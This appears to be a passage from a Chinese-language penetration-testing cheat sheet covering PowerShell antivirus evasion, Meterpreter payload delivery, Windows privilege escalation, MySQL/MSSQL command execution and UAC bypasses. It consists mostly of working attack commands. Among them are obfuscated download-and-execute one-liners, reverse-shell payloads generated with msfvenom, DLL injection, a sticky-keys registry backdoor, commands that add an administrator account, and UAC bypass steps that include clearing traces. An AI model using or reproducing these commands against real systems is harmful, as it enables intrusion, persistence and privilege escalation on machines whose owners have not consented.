&quot;文件的base64编码&quot;\n$PEBytes = [System.Convert]::FromBase64String($InputString)\n文件尾部添加\nwrite-host (&quot;[+] Executing Command: &quot;+$Command)  -foregroundcolor &quot;Green&quot;\nInvoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Command \nwrite-host (&quot;[+] Done !&quot;)  -foregroundcolor &quot;Green&quot;\n&#125;\n</code></pre>\n<p><img data-src=\"102.png\" alt=\"\" /></p>\n<pre><code>远程下载执行\n&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.0.107/ps/powersploit/CodeExecution/ms15051.ps1'); MS15051 –Command \\&quot;whoami\\&quot;&quot;\n</code></pre>\n<p><img data-src=\"103.png\" alt=\"\" /></p>\n<h3 id=\"绕过策略\"><a class=\"anchor\" href=\"#绕过策略\">#</a> 绕过策略</h3>\n<pre><code>&gt;powershell Set-ExecutionPolicy Unrestricted需管理员权限，不受限执行\n&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/Invoke-xxx.ps1');invoke-xxx&quot;\n&gt;powershell -exec bypass -File ./a.ps1&amp;&gt;Import-Module xxx\n</code></pre>\n<h2 id=\"-242\"><a class=\"anchor\" href=\"#-242\">#</a> </h2>\n<h2 id=\"base64-2\"><a class=\"anchor\" href=\"#base64-2\">#</a> Base64</h2>\n<pre><code>&gt;use exploit/multi/script/web_delivery|target=2(PSH)\n&amp;\n&gt;cat payload.txt | iconv --to-code UTF-16LE |base64\n&gt;powershell -ep bypass -enc base64code\n</code></pre>\n<h2 id=\"-243\"><a class=\"anchor\" href=\"#-243\">#</a> </h2>\n<h2 id=\"写入bat绕过\"><a class=\"anchor\" href=\"#写入bat绕过\">#</a> 写入 bat 绕过</h2>\n<pre><code>powershell -exec bypass -File ./a.ps1 \n将该命令保存为c.bat\n</code></pre>\n<h2 id=\"-244\"><a class=\"anchor\" href=\"#-244\">#</a> </h2>\n<h2 id=\"拼接拆分字符串\"><a class=\"anchor\" href=\"#拼接拆分字符串\">#</a> 拼接拆分字符串</h2>\n<pre><code>powershell.exe  \n&quot;\n$c1='powershell -c IEX'; \n$c2='(New-Object Net.WebClient).Downlo'; \n$c3='adString(&quot;http://192.168.197.192/a.ps1&quot;)'; \necho ($c1,$c2,$c3) \n&quot; \n先将命令拆分为字符串，然后进行拼接。echo修改为IEX执行。\npowershell $c2='IEX (New-Object Net.WebClient).Downlo';$c3='adString(''http://x.x.x.x/a'')'; $Text=$c2+$c3; IEX(-join $Text)\n</code></pre>\n<h2 id=\"-245\"><a class=\"anchor\" href=\"#-245\">#</a> </h2>\n<h2 id=\"replace替换函数\"><a class=\"anchor\" href=\"#replace替换函数\">#</a> Replace 替换函数</h2>\n<pre><code>powershell -noexit &quot;$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://192.168.0.108/1.ps1'')'.Replace('123','adString');IEX ($c1+$c2)&quot; \n</code></pre>\n<h2 id=\"-246\"><a class=\"anchor\" href=\"#-246\">#</a> </h2>\n<h2 id=\"http字符拼接绕过\"><a class=\"anchor\" href=\"#http字符拼接绕过\">#</a> HTTP 字符拼接绕过</h2>\n<pre><code>也可以对http字符进行绕过，同样可以bypass\npowershell &quot;$a='IEX((new-object net.webclient).downloadstring(&quot;ht';$b='tp://192.168.197.192/a.ps1&quot;))';IEX ($a+$b)&quot;  \n</code></pre>\n<h2 id=\"-247\"><a class=\"anchor\" href=\"#-247\">#</a> </h2>\n<h2 id=\"图片免杀\"><a class=\"anchor\" href=\"#图片免杀\">#</a> 图片免杀</h2>\n<pre><code>通过图片免杀执行powershell的脚本Invoke-PSImage.ps1，主要把payload分散存到图片的像素中,最后到远端执行时,再重新遍历重组像素中的payload执行。\nhttps://github.com/peewpw/Invoke-PSImage\n1900*1200的图片x.jpg。\nC:\\&gt;powershell \nPS C:\\&gt; Import-Module .\\Invoke-PSImage.ps1 \nPS C:\\&gt; Invoke-PSImage -Script .\\a.ps1 -Image .\\x.jpg -Out .\\reverse_shell.png -Web \na.ps1是msf木马，-Out 生成reverse_shell.png图片，-Web 输出从web读取的命令。\n将reverse_shell.png移动至web目录，替换url地址。在powershell下执行即可。\n</code></pre>\n<h2 id=\"-248\"><a class=\"anchor\" href=\"#-248\">#</a> </h2>\n<h2 id=\"加载shellcode\"><a class=\"anchor\" href=\"#加载shellcode\">#</a> 加载 shellcode</h2>\n<pre><code>msfvenom生成脚本木马\n#msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.72.164 LPORT=4444 -f powershell -o /var/www/html/test  \n在windows靶机上运行一下命令\nPS &gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;) \nPS &gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.72.164/test&quot;) \nInvoke-Shellcode -Shellcode $buf -Force  运行木马 \n使用Invoke-Shellcode.ps1脚本执行shellcode\n即可反弹meterpreter shell\n</code></pre>\n<h2 id=\"-249\"><a class=\"anchor\" href=\"#-249\">#</a> </h2>\n<h2 id=\"加载dll\"><a class=\"anchor\" href=\"#加载dll\">#</a> 加载 dll</h2>\n<pre><code>使用msfvenom 生成dll木马脚本\n&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.72.164 lport=4444 -f dll -o /var/www/html/test.dll \n将生成的dll上传到目标的C盘。在靶机上执行以下命令\nPS &gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;) \nStart-Process c:\\windows\\system32\\notepad.exe -WindowStyle Hidden  \n创建新的进程启动记事本，并设置为隐藏\nInvoke-DllInjection -ProcessID xxx -Dll c:\\test.dll 使用notepad的PID  \nMsf\n#use exploit/multi/handler\n#set payload windows/x64/meterpreter/reverse_tcp\n#run\n</code></pre>\n<h2 id=\"windows安全标识符sid\"><a class=\"anchor\" href=\"#windows安全标识符sid\">#</a> Windows 安全标识符 (SID)</h2>\n<table>\n<thead>\n<tr>\n<th>相对标识符</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>500</td>\n<td>管理员</td>\n</tr>\n<tr>\n<td>501</td>\n<td>来宾</td>\n</tr>\n<tr>\n<td>502</td>\n<td>密钥分发中心服务的服务账户</td>\n</tr>\n<tr>\n<td>512</td>\n<td>域管理员</td>\n</tr>\n<tr>\n<td>513</td>\n<td>域用户</td>\n</tr>\n<tr>\n<td>514</td>\n<td>域来宾</td>\n</tr>\n<tr>\n<td>515</td>\n<td>域计算机</td>\n</tr>\n<tr>\n<td>516</td>\n<td>域控制器</td>\n</tr>\n<tr>\n<td>544</td>\n<td>内置管理员</td>\n</tr>\n<tr>\n<td>519</td>\n<td>企业管理员</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h2>\n<h3 id=\"impacket工具包\"><a class=\"anchor\" href=\"#impacket工具包\">#</a> Impacket 工具包</h3>\n<pre><code>https://github.com/maaaaz/impacket-examples-windows\nhttps://github.com/SecureAuthCorp/impacket\n#git clone https://github.com/CoreSecurity/impacket.git \n#cd impacket/ \n#python setup.py install\n</code></pre>\n<h3 id=\"windows-exploit-suggester\"><a class=\"anchor\" href=\"#windows-exploit-suggester\">#</a> Windows-exploit-suggester</h3>\n<pre><code>#pip install xlrd --upgrade\n#./windows-exploit-suggester.py --update\n#./windows-exploit-suggester.py --database 20xx-xx-xx-mssb.xlsx --systeminfo systeminfo.txt\n</code></pre>\n<h3 id=\"wesng\"><a class=\"anchor\" href=\"#wesng\">#</a> Wesng</h3>\n<pre><code>https://github.com/bitsadmin/wesng\n&gt;systeminfo &gt;1.txt\n&gt;python wes.py 1.txt\n</code></pre>\n<p><img data-src=\"104.png\" alt=\"\" /></p>\n<h3 id=\"searchsploit\"><a class=\"anchor\" href=\"#searchsploit\">#</a> Searchsploit</h3>\n<pre><code>使用方法\n&gt;searchsploit 软件 版本\n查找常见补丁\nhttps://bugs.hacking8.com/tiquan/\nhttp://get-av.se7ensec.cn/index.php\nhttps://patchchecker.com/checkprivs/\nwmic查询补丁\nwmic qfe list full|findstr /i hotfix\nsysteminfo&gt;temp.txt&amp;(for %i in (KB2271195 KB2124261 KB2160329 KB2621440  KB2707511 KB2829361 KB2864063 KB3000061 KB3045171 KB3036220 KB3077657 KB3079904 KB3134228 KB3124280 KB3199135) do @type temp.txt|@find /i  &quot;%i&quot;|| @echo %i Not Installed!)&amp;del /f /q /a temp.txt\nMS17-017 [KB4013081] [GDI Palette Objects Local Privilege Escalation] (windows 7/8) \nCVE-2017-8464 [LNK Remote Code Execution Vulnerability] (windows 10/8.1/7/2016/2010/2008) \nCVE-2017-0213 [Windows COM Elevation of Privilege Vulnerability] (windows 10/8.1/7/2016/2010/2008) \nMS17-010 [KB4013389] [Windows Kernel Mode Drivers] (windows 7/2008/2003/XP) \nMS16-135 [KB3199135] [Windows Kernel Mode Drivers] (2016) \nMS16-111 [KB3186973] [kernel api] (Windows 10 10586 (32/64)/8.1) \nMS16-098 [KB3178466] [Kernel Driver] (Win 8.1) \nMS16-075 [KB3164038] [Hot Potato] (2003/2008/7/8/2012) \nMS16-034 [KB3143145] [Kernel Driver] (2008/7/8/10/2012) \nMS16-032 [KB3143141] [Secondary Logon Handle] (2008/7/8/10/2012) \nMS16-016 [KB3136041] [WebDAV] (2008/Vista/7) \nMS15-097 [KB3089656] [remote code execution] (win8.1/2012) \nMS15-076 [KB3067505] [RPC] (2003/2008/7/8/2012) \nMS15-077 [KB3077657] [ATM] (XP/Vista/Win7/Win8/2000/2003/2008/2012) \nMS15-061 [KB3057839] [Kernel Driver] (2003/2008/7/8/2012) \nMS15-051 [KB3057191] [Windows Kernel Mode Drivers] (2003/2008/7/8/2012) \nMS15-010 [KB3036220] [Kernel Driver] (2003/2008/7/8) \nMS15-015 [KB3031432] [Kernel Driver] (Win7/8/8.1/2012/RT/2012 R2/2008 R2) \nMS15-001 [KB3023266] [Kernel Driver] (2008/2012/7/8) \nMS14-070 [KB2989935] [Kernel Driver] (2003) \nMS14-068 [KB3011780] [Domain Privilege Escalation] (2003/2008/2012/7/8) \nMS14-058 [KB3000061] [Win32k.sys] (2003/2008/2012/7/8) \nMS14-040 [KB2975684] [AFD Driver] (2003/2008/2012/7/8) \nMS14-002 [KB2914368] [NDProxy] (2003/XP) \nMS13-053 [KB2850851] [win32k.sys] (XP/Vista/2003/2008/win 7) \nMS13-046 [KB2840221] [dxgkrnl.sys] (Vista/2003/2008/2012/7) \nMS13-005 [KB2778930] [Kernel Mode Driver] (2003/2008/2012/win7/8) \nMS12-042 [KB2972621] [Service Bus] (2008/2012/win7) \nMS12-020 [KB2671387] [RDP] (2003/2008/7/XP) \nMS11-080 [KB2592799] [AFD.sys] (2003/XP) \nMS11-062 [KB2566454] [NDISTAPI] (2003/XP) \nMS11-046 [KB2503665] [AFD.sys] (2003/2008/7/XP) \nMS11-011 [KB2393802] [kernel Driver] (2003/2008/7/XP/Vista) \nMS10-092 [KB2305420] [Task Scheduler] (2008/7) \nMS10-065 [KB2267960] [FastCGI] (IIS 5.1, 6.0, 7.0, and 7.5) \nMS10-059 [KB982799] [ACL-Churraskito] (2008/7/Vista) \nMS10-048 [KB2160329] [win32k.sys] (XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7) \nMS10-015 [KB977165] [KiTrap0D] (2003/2008/7/XP) \nMS10-012 [KB971468] [SMB Client Trans2 stack overflow] (Windows 7/2008R2) \nMS09-050 [KB975517] [Remote Code Execution] (2008/Vista) \nMS09-020 [KB970483] [IIS 6.0] (IIS 5.1 and 6.0) \nMS09-012 [KB959454] [Chimichurri] (Vista/win7/2008/Vista) \nMS08-068 [KB957097] [Remote Code Execution] (2000/XP) \nMS08-067 [KB958644] [Remote Code Execution] (Windows 2000/XP/Server 2003/Vista/Server 2008) \nMS08-066 [] [] (Windows 2000/XP/Server 2003) \nMS08-025 [KB941693] [Win32.sys] (XP/2003/2008/Vista) \nMS06-040 [KB921883] [Remote Code Execution] (2003/xp/2000) \nMS05-039 [KB899588] [PnP Service] (Win 9X/ME/NT/2000/XP/2003)\nMS03-026 [KB823980] [Buffer Overrun In RPC Interface] (/NT/2000/XP/2003)\n</code></pre>\n<h3 id=\"激活guest\"><a class=\"anchor\" href=\"#激活guest\">#</a> 激活 guest</h3>\n<pre><code>&gt;net user guest /active:yes\n</code></pre>\n<h3 id=\"mysql-udf\"><a class=\"anchor\" href=\"#mysql-udf\">#</a> MYSQL udf</h3>\n<pre><code>Udf: sqlmap-master\\udf\\mysql\\windows\\\n&gt;python sqlmap/extra/cloak/cloak.py lib_mysqludf_sys.dll _ \nMysql&gt;5.1 udf.dll放置在lib\\plugin \nMysql&lt;5.1 udf.dll放置在c:\\windows\\system32\n#show variables like '%compile%'; 查看系统版本\n#select @@plugin_dir 查看插件目录\n放入udf\n#select load_file('\\\\\\\\192.168.0.19\\\\network\\\\lib_mysqludf_sys_64.dll') into dumpfile &quot;D:\\\\MySQL\\\\mysql-5.7.2\\\\lib\\\\plugin\\\\udf.dll&quot;; \n或将udf十六进制编码后写入\n#select hex(load_file('udf_sys_64.dll')) into dumpfile '/tmp/udf.hex'; \n#select 0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000… into dump file &quot;D:\\\\MySQL\\\\mysql-5.7.2\\\\lib\\\\plugin\\\\udf.dll&quot;;\n或将udf base64编码后写入(MySQL 5.6.1和MariaDB 10.0.5)\n#select to_base64(load_file('/usr/udf.dll')) into dumpfile '/tmp/udf.b64';\n#select from_base64(“xxxxx”) into dumpfile &quot;D:\\\\MySQL\\\\mysql-5.7.2\\\\lib\\\\plugin\\\\udf.dll&quot;;\n或创建表拼接十六进制编码\n#create table temp(data longblob); \n#insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d); \n#update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b3); \n#select data from temp into dump file &quot;D:\\\\MySQL\\\\mysql-5.7.2\\\\lib\\\\plugin\\\\udf.dll&quot;;\n或#insert into temp(data) values(hex(load_file('D:\\\\MySQL\\\\mysql-5.7.2\\\\lib\\\\plugin\\\\udf.dll')));\n#SELECT unhex(cmd) FROM mysql.temp INTO DUMPFILE 'D:\\\\MySQL\\\\mysql-5.7.2\\\\lib\\\\plugin\\\\udf.dll ';\n或使用快速导入数据\n#load data infile '\\\\\\\\192.168.0.19\\\\network\\\\udf.hex'\n#into table temp fields terminated by '@OsandaMalith' lines terminated by '@OsandaMalith' (data); \n#select unhex(data) from temp into dumpfile 'D:\\\\MySQL\\\\mysql-5.7.2\\\\lib\\\\plugin\\\\udf.dll';\n创建函数\n#create function cmdshell returns string soname 'udf.dll';\n#create function sys_exec returns int soname 'udf.dll';\n执行命令\n#select cmdshell('whoami'); \n#select sys_exec(''whoami''); \n删除函数\n#drop function cmdshell;\n#drop function sys_exec;\n</code></pre>\n<h3 id=\"mysql-linux-root\"><a class=\"anchor\" href=\"#mysql-linux-root\">#</a> MYSQL Linux Root</h3>\n<pre><code>https://0xdeadbeef.info/exploits/raptor_udf2.c\n$ gcc -g -c raptor_udf2.c\n$ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc\n$ mysql -u root -p\nmysql&gt; use mysql;\nmysql&gt; create table foo(line blob);\nmysql&gt; insert into foo values(load_file('/home/raptor/raptor_udf2.so'));\nmysql&gt; select * from foo into dumpfile '/usr/lib/raptor_udf2.so';\nmysql&gt; create function do_system returns integer soname 'raptor_udf2.so';\nmysql&gt; select * from mysql.func;\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>name</th>\n<th>ret</th>\n<th>dl</th>\n<th>type</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>do_system</td>\n<td>2</td>\n<td>raptor_udf2.so</td>\n<td>function</td>\n</tr>\n</tbody>\n</table>\n<pre><code>mysql&gt; select do_system('id &gt; /tmp/out; chown raptor.raptor /tmp/out');\nmysql&gt; \\! sh\nsh-2.05b$ cat /tmp/out\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)\n</code></pre>\n<h3 id=\"mssql-5\"><a class=\"anchor\" href=\"#mssql-5\">#</a> MSSQL</h3>\n<pre><code>开启xp_cmdshell\n</code></pre>\n<h2 id=\"-250\"><a class=\"anchor\" href=\"#-250\">#</a> </h2>\n<h2 id=\"xp_cmdshell\"><a class=\"anchor\" href=\"#xp_cmdshell\">#</a> xp_cmdshell</h2>\n<pre><code>#exec sp_configure 'show advanced options', 1;reconfigure; \n#exec sp_configure 'xp_cmdshell',1;reconfigure;\n#exec master.dbo.xp_cmdshell 'ipconfig'\n</code></pre>\n<h2 id=\"-251\"><a class=\"anchor\" href=\"#-251\">#</a> </h2>\n<h2 id=\"xp_regwrite\"><a class=\"anchor\" href=\"#xp_regwrite\">#</a> xp_regwrite</h2>\n<pre><code>xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe','debugger','reg_sz','c:\\windows\\system32\\taskmgr.exe'\n</code></pre>\n<h2 id=\"-252\"><a class=\"anchor\" href=\"#-252\">#</a> </h2>\n<h2 id=\"xp_dirtree\"><a class=\"anchor\" href=\"#xp_dirtree\">#</a> xp_dirtree</h2>\n<pre><code>execute master..xp_dirtree 'c:' //列出所有c:\\文件和目录,子目录 \nexecute master..xp_dirtree 'c:',1 //只列c:\\文件夹 \nexecute master..xp_dirtree 'c:',1,1 //列c:\\文件夹加文件 \n</code></pre>\n<h2 id=\"-253\"><a class=\"anchor\" href=\"#-253\">#</a> </h2>\n<h2 id=\"sp_oacreate\"><a class=\"anchor\" href=\"#sp_oacreate\">#</a> sp_oacreate</h2>\n<pre><code>exec sp_configure 'show advanced options', 1;RECONFIGURE;\nexec sp_configure 'Ola Automation Procedures' , 1;RECONFIGURE;\n执行命令\ndeclare @shell int \nexec sp_oacreate 'wscript.shell',@shell output \nexec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c net user 123 123 /add'\ndeclare @shell int \nexec sp_oacreate 'wscript.shell',@shell output \nexec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c net localgroup administrators 123/add'\n删除文件\ndeclare @result int\ndeclare @fso_token int\nexec sp_oacreate 'scripting.filesystemobject', @fso_token out\nexec sp_oamethod @fso_token,'deletefile',null,'c:\\1.txt'\nexec sp_oadestroy @fso_token\n复制文件\ndeclare @o int\nexec sp_oacreate 'scripting.filesystemobject',@o out\nexec sp_oamethod @o,'copyfile',null,'c:\\1.txt','c:\\2.txt'\n移动文件\ndeclare @o int\nexec sp_oacreate 'scripting.filesystemobject',@o out\nexec sp_oamethod @o,'movefile',null,'c:\\1.txt','c:\\2.txt'\n</code></pre>\n<h2 id=\"-254\"><a class=\"anchor\" href=\"#-254\">#</a> </h2>\n<h2 id=\"沙盒执行\"><a class=\"anchor\" href=\"#沙盒执行\">#</a> 沙盒执行</h2>\n<pre><code>开启沙盒：\n&gt;exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',1\n执行：\n&gt;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\windows\\system32\\ias\\dnary.mdb','select shell(&quot;whoami&quot;)')\n</code></pre>\n<h2 id=\"-255\"><a class=\"anchor\" href=\"#-255\">#</a> </h2>\n<h2 id=\"warsqlkit后门\"><a class=\"anchor\" href=\"#warsqlkit后门\">#</a> WarSQLKit (后门)</h2>\n<pre><code>http://eyupcelik.com.tr/guvenlik/493-mssql-fileless-rootkit-warsqlkit\n</code></pre>\n<h3 id=\"msf\"><a class=\"anchor\" href=\"#msf\">#</a> MSF</h3>\n<pre><code>发现补丁\n#use post/windows/gather/enum_patches\n列举可用EXP\n#use post/multi/recon/local_exploit_suggester\n</code></pre>\n<h3 id=\"bypass-uac\"><a class=\"anchor\" href=\"#bypass-uac\">#</a> Bypass UAC</h3>\n<h2 id=\"-256\"><a class=\"anchor\" href=\"#-256\">#</a> </h2>\n<h2 id=\"msf-2\"><a class=\"anchor\" href=\"#msf-2\">#</a> MSF</h2>\n<pre><code>&gt;use exploit/windows/local/bypassuac \n&gt;use exploit/windows/local/bypassuac_injection\n&gt;use exploit/windows/local/bypassuac_vbs\n&gt;use exploit/windows/local/bypassuac_fodhelper\n&gt;use exploit/windows/local/bypassuac_eventvwr\n&gt;use exploit/windows/local/bypassuac_comhijack\n</code></pre>\n<h2 id=\"-257\"><a class=\"anchor\" href=\"#-257\">#</a> </h2>\n<h2 id=\"dccwbypassuac\"><a class=\"anchor\" href=\"#dccwbypassuac\">#</a> DccwBypassUAC</h2>\n<pre><code>Use on win10&amp;win8\n</code></pre>\n<p><img data-src=\"105.png\" alt=\"\" /></p>\n<h2 id=\"-258\"><a class=\"anchor\" href=\"#-258\">#</a> </h2>\n<h2 id=\"k8uac\"><a class=\"anchor\" href=\"#k8uac\">#</a> K8uac</h2>\n<pre><code>&gt;k8uac.exe xx.exe\n&gt;k8uac.exe &quot;command&quot;\n</code></pre>\n<h2 id=\"-259\"><a class=\"anchor\" href=\"#-259\">#</a> </h2>\n<h2 id=\"cmstp\"><a class=\"anchor\" href=\"#cmstp\">#</a> CMSTP</h2>\n<pre><code>设置UAC和Applocker规则\n</code></pre>\n<p><img data-src=\"106.png\" alt=\"\" /><br />\n<img data-src=\"107.png\" alt=\"\" /><br />\n<img data-src=\"108.png\" alt=\"\" /><br />\n<img data-src=\"109.png\" alt=\"\" /></p>\n<pre><code>MSF生成恶意DLL传入靶机\n&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f dll -o /var/www/html/cm.dll\n</code></pre>\n<p><img data-src=\"110.png\" alt=\"\" /></p>\n<pre><code>DLL同目录下建立run.inf，RegisterOCXSection指定dll位置，也可以指定远程webdav\n如：\\\\192.168.0.107\\webdav\\cm.dll\n[version]\nSignature=$chicago$\nAdvancedINF=2.5\n[DefaultInstall_SingleUser]\nRegisterOCXs=RegisterOCXSection\n[RegisterOCXSection]\nC:\\Users\\y.SUB2K8\\Desktop\\cm.dll\n[Strings]\nAppAct = &quot;SOFTWARE\\Microsoft\\Connection Manager&quot;\nServiceName=&quot;cmstp&quot;\nShortSvcName=&quot;cmstp&quot;\n执行命令可绕过UAC和Applocker上线\n&gt;cmstp /s run.inf\n</code></pre>\n<p><img data-src=\"111.png\" alt=\"\" /></p>\n<h2 id=\"-260\"><a class=\"anchor\" href=\"#-260\">#</a> </h2>\n<h2 id=\"uacme\"><a class=\"anchor\" href=\"#uacme\">#</a> Uacme</h2>\n<pre><code>包括DLL劫持，COM劫持等50多种bypass方法\nhttps://github.com/hfiref0x/UACME\n</code></pre>\n<p><img data-src=\"112.png\" alt=\"\" /></p>\n<pre><code>使用visual studio编译\nVisual Studio 2013v120；\nVisual Studio 2015v140；\nVisual Studio 2017v141;\nVisual Studio 2019v142。\n目前共59种bypassuac方式\n执行方法是\n&gt;akagi.exe 1\n&gt;akagi.exe 1 c:\\windows\\system32\\cmd.exe\n&gt;akagi.exe 1 &quot;net user 1 1 /add&quot;\n注意：\n方式5，9会对目标安全性产生影响，谨慎使用，5需重启\n方式6从win8开始在x64上不可用\n方式11，54只支持x32 \n方式13，19，30，50只支持x64\n方式14需要进程注入，x64要使用x64的工具\n</code></pre>\n<h2 id=\"-261\"><a class=\"anchor\" href=\"#-261\">#</a> </h2>\n<h2 id=\"bypass-uac-2\"><a class=\"anchor\" href=\"#bypass-uac-2\">#</a> Bypass-UAC</h2>\n<pre><code>https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC\n&gt;Bypass-UAC -Method UacMethodSysprep\n</code></pre>\n<p><img data-src=\"113.png\" alt=\"\" /></p>\n<pre><code>Method:\nUacMethodSysprep\nucmDismMethod\nUacMethodMMC2\nUacMethodTcmsetup\nUacMethodNetOle32\n</code></pre>\n<h2 id=\"-262\"><a class=\"anchor\" href=\"#-262\">#</a> </h2>\n<h2 id=\"dll-hijack\"><a class=\"anchor\" href=\"#dll-hijack\">#</a> DLL hijack</h2>\n<pre><code>程序运行，调用DLL的流程\n1.程序所在目录\n2.系统目录即 SYSTEM32 目录\n3.16位系统目录即 SYSTEM 目录\n4.Windows目录\n5.加载 DLL 时所在的当前目录\n6.PATH环境变量中列出的目录\n使用\nhttps://docs.microsoft.com/zh-cn/sysinternals/downloads/sigcheck\n检查一个程序的是否以高权限执行\n&gt;sigcheck.exe -m c:\\1.exe\n查看autoElevate是否为true\n</code></pre>\n<p><img data-src=\"114.png\" alt=\"\" /></p>\n<pre><code>使用process monitor查看对应程序执行时调用的DLL情况，查找DLL不在\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs列表中，并且所在文件夹当前用户可读写，接下来生成恶意dll备份原DLL替换，再运行此程序即可劫持成功。\n</code></pre>\n<h2 id=\"-263\"><a class=\"anchor\" href=\"#-263\">#</a> </h2>\n<h2 id=\"silentcleanup\"><a class=\"anchor\" href=\"#silentcleanup\">#</a> SilentCleanup</h2>\n<pre><code>&gt;reg add hkcu\\Environment /v windir /d &quot;cmd /K reg delete hkcu\\Environment /v windir /f &amp;&amp; REM &quot;\n&gt;schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n</code></pre>\n<h2 id=\"-264\"><a class=\"anchor\" href=\"#-264\">#</a> </h2>\n<h2 id=\"sdclt\"><a class=\"anchor\" href=\"#sdclt\">#</a> Sdclt</h2>\n<pre><code>win10\n</code></pre>\n<h2 id=\"-265\"><a class=\"anchor\" href=\"#-265\">#</a> </h2>\n<h3 id=\"1-2\"><a class=\"anchor\" href=\"#1-2\">#</a> 1</h3>\n<pre><code>&gt;reg add &quot;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe&quot; /t REG_SZ /d %COMSPEC% /f 获得管理员权限\n&gt;sdclt 弹出cmd\n&gt;reg delete &quot;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe&quot; /f 清除痕迹\n</code></pre>\n<h2 id=\"-266\"><a class=\"anchor\" href=\"#-266\">#</a> </h2>\n<h3 id=\"2-2\"><a class=\"anchor\" href=\"#2-2\">#</a> 2</h3>\n<pre><code>https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-SDCLTBypass.ps1\n&gt;Invoke-SDCLTBypass -Command &quot;c:\\windows\\system32\\cmd.exe /c C:\\Windows\\regedit.exe&quot;\n&gt;sdclt.exe /KickOffElev\n</code></pre>\n<h2 id=\"-267\"><a class=\"anchor\" href=\"#-267\">#</a> </h2>\n<h2 id=\"makecabwusa\"><a class=\"anchor\" href=\"#makecabwusa\">#</a> Makecab&amp;Wusa</h2>\n<pre><code>复制文件出错时\n</code></pre>\n<p><img data-src=\"115.png\" alt=\"\" /></p>\n<pre><code>&gt;makecab PsExec64.exe C:\\Users\\y.ZONE\\Desktop\\ps.cab\n&gt;wusa C:\\Users\\y.ZONE\\Desktop\\ps.cab /extract:C:\\Windows\\system32\\\n</code></pre>\n<p><img data-src=\"116.png\" alt=\"\" /></p>\n<h2 id=\"-268\"><a class=\"anchor\" href=\"#-268\">#</a> </h2>\n<h2 id=\"clr-bypassuac\"><a class=\"anchor\" href=\"#clr-bypassuac\">#</a> CLR BypassUAC</h2>\n<pre><code>Tested on win10 x64\n生成dll传入受控机temp目录，以下保存为1.bat执行。\nREG ADD &quot;HKCU\\Software\\Classes\\CLSID\\&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;\\InprocServer32&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\\Temp\\test.dll&quot; /f\nREG ADD &quot;HKCU\\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot; /f\nREG ADD &quot;HKCU\\Environment&quot; /v &quot;COR_ENABLE_PROFILING&quot; /t REG_SZ /d &quot;1&quot; /f\nREG ADD &quot;HKCU\\Environment&quot; /v &quot;COR_PROFILER_PATH&quot; /t REG_SZ /d &quot;C:\\Temp\\test.dll&quot; /f\n受控机执行gpedit.msc或eventvwr等高权限.net程序时可劫持成功。\n</code></pre>\n<p><img data-src=\"117.png\" alt=\"\" /></p>\n<pre><code>执行后\n</code></pre>\n<p><img data-src=\"118.png\" alt=\"\" /><br />\n<img data-src=\"119.png\" alt=\"\" /><br />\n<img data-src=\"120.png\" alt=\"\" /></p>\n<h2 id=\"-269\"><a class=\"anchor\" href=\"#-269\">#</a> </h2>\n<h2 id=\"eventvwr劫持注册表\"><a class=\"anchor\" href=\"#eventvwr劫持注册表\">#</a> eventvwr 劫持注册表</h2>\n<pre><code>打开ProcessMonitor，启动eventvwr，ctrl+T打开进程树，选择进程转到事件\n</code></pre>\n<p><img data-src=\"121.png\" alt=\"\" /></p>\n<pre><code>右键选择包括eventvwr.exe\n</code></pre>\n<p><img data-src=\"122.png\" alt=\"\" /></p>\n<pre><code>只选择显示注册表活动\n</code></pre>\n<p><img data-src=\"123.png\" alt=\"\" 